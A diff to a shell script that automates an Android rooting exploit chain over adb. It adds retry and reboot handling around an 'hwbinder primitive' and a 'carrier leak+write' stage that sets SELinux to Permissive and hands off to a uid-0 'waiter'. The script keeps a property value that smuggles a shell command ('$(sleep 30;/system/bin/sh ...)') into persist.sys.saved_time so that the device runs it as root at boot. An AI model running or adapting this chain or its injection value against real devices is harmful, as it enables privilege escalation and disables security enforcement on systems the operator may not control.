@@ -23,6 +23,7 @@ adb_bin="${ADB:-$repo_dir/tools/adb-portable.sh}"
 
 payload_default="$repo_dir/scripts/rootsvc_payload.sh"
 waiter_trigger='x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000'
+. "$repo_dir/scripts/phase_b_status.sh"
 
 generate_payload() {
   cat > "$payload_default" <<'PAYLOAD_EOF'
@@ -61,8 +62,7 @@ check_device() {
 
 armed_status() {
   saved_time="$(adb shell getprop persist.sys.saved_time 2>&1 | tr -d '\r')"
-  if [ "$saved_time" = "$waiter_trigger" ]; then echo ARMED
-  else echo "NUMERIC($saved_time)"; fi
+  waiter_state_for_value "$saved_time" "$waiter_trigger"
 }
 
 phase_status() {
@@ -91,6 +91,38 @@ wait_60s_for_waiter() {
   # Waiter fires ~30s into a boot; on a fresh boot we landed within that window
   # so this is only a sanity wait when device was rebooted by us.
   true
+}
+
+prepare_retry_after_spent_primitive() {
+  retry_number="$1"
+  payload="$2"
+  echo "stateful hwbinder primitive spent; rebooting before attempt $retry_number"
+  adb reboot >/dev/null 2>&1 || true
+  sleep 10
+  adb wait-for-device || true
+  check_device
+
+  state="$(armed_status)"
+  case "$state" in
+    ARMED)
+      echo "waiter remains armed on fresh boot"
+      ;;
+    NUMERIC*)
+      echo "waiter trigger was consumed and normalized by time_update ($state)"
+      echo "using this boot only to re-stage the waiter; Phase B needs a separate fresh boot"
+      "$repo_dir/scripts/stage_reroot_waiter.sh" "$payload" \
+        || die "waiter re-staging failed after spent hwbinder attempt"
+      adb reboot >/dev/null 2>&1 || true
+      sleep 10
+      adb wait-for-device || true
+      check_device
+      [ "$(armed_status)" = ARMED ] \
+        || die "waiter was not armed for retry attempt $retry_number"
+      ;;
+    *)
+      die "waiter state is neither armed nor safely numeric after reboot: $state"
+      ;;
+  esac
 }
 
 root_flow() {
@@ -123,18 +155,34 @@ root_flow() {
   esac
   attempt=1
   while :; do
+    current_waiter_state="$(armed_status)"
+    case "$current_waiter_state" in
+      ARMED) : ;;
+      NUMERIC*) die "Phase B cannot start: time_update waiter is unarmed ($current_waiter_state); re-stage it on a dedicated staging boot" ;;
+      *) die "Phase B cannot start with invalid waiter state: $current_waiter_state" ;;
+    esac
     echo "** PHASE B: root chain attempt $attempt/$max_attempts (carrier leak+write -> Permissive -> uid-0 waiter handoff) **"
     if "$repo_dir/scripts/reroot_after_boot.sh" "$payload"; then
       break
+    else
+      phase_b_result=$?
+    fi
+    action="$(phase_b_retry_action "$phase_b_result")"
+    if [ "$action" != RETRY_FRESH_BOOT ]; then
+      case "$phase_b_result" in
+        "$PHASE_B_PRECHECK") class="pre-exploit validation/configuration" ;;
+        "$PHASE_B_CARRIER_START") class="carrier start" ;;
+        "$PHASE_B_VALIDATION") class="carrier validation/configuration" ;;
+        "$PHASE_B_WAITER_STATE") class="waiter state" ;;
+        "$PHASE_B_POST_WRITE") class="post-write" ;;
+        *) class="unknown" ;;
+      esac
+      die "Phase B aborted after $class failure (exit=$phase_b_result); automatic reboot would not make this deterministic failure safe"
     fi
     [ "$attempt" -lt "$max_attempts" ] \
-      || die "phase B failed after $max_attempts clean-boot attempts"
+      || die "stateful hwbinder attempt failed after $max_attempts fresh-boot attempts"
     attempt=$((attempt + 1))
-    echo "phase B boot state spent; host-requested reboot before attempt $attempt"
-    adb reboot >/dev/null 2>&1 || true
-    sleep 10
-    adb wait-for-device || true
-    check_device
+    prepare_retry_after_spent_primitive "$attempt" "$payload"
   done
 
   echo
